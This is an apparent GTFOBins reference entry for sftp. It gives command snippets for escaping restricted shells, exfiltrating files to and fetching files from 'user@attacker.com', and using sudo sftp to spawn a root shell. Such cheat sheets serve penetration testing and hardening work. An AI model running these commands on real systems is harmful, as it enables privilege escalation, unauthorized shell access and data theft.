# GTFOBin: sftp

## Shell

It can be used to break out from restricted environments by spawning an interactive system shell.

```
HOST=user@attacker.com
sftp $HOST
!/bin/sh
```

## File upload

It can exfiltrate files on the network.

Send local file to a SSH server.

```
RHOST=user@attacker.com
sftp $RHOST
put file_to_send file_to_save
```

## File download

It can download remote files.

Fetch a remote file from a SSH server.

```
RHOST=user@attacker.com
sftp $RHOST
get file_to_get file_to_save
```

## Sudo

If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

```
HOST=user@attacker.com
sudo sftp $HOST
!/bin/sh
```